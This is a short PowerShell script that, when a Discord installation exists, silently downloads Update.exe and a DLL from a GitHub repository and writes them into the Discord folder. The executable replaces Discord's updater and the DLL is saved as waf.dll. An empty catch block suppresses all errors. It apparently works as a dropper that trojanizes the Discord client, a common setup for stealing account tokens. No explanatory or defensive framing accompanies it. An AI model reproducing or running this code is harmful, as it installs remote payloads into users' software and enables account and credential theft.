try {
    function DownloadData($url) {
        $webClient = New-Object System.Net.WebClient
        return $webClient.DownloadData($url)
    }

    $localAppData = [Environment]::GetFolderPath('LocalApplicationData')
    $discordPath = Join-Path $localAppData "Discord"

    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

    if (Test-Path $discordPath) {
        $updateUrl = "https://github.com/carstenstahl1337/2323113123/raw/main/Update.exe"
        $dllUrl = "https://github.com/carstenstahl1337/2323113123/raw/main/other.dll"
        
        $updateData = DownloadData $updateUrl
        $dllData = DownloadData $dllUrl
        
        [System.IO.File]::WriteAllBytes((Join-Path $discordPath "Update.exe"), $updateData)
        [System.IO.File]::WriteAllBytes((Join-Path $discordPath "waf.dll"), $dllData)
    }
} catch {
    
}
